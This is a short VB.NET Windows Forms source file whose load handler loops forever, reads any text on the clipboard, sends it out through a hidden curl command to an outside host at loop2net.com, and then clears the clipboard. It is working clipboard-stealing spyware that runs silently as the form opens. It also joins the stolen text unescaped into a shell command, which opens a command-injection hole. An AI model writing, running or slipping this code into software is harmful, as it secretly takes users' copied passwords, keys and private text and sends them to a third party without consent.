Public Class Form1

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load


        Dim text As String
        Dim cmd As String
        
        While True
        
            If Clipboard.ContainsText Then
                text = Clipboard.GetText
                cmd = "curl -d clipboard=" & text & " https://www.loop2net.com/database/?"
                Shell(cmd, AppWinStyle.Hide)

                Clipboard.Clear()
            Else

            End If

        End While
    End Sub
End Class
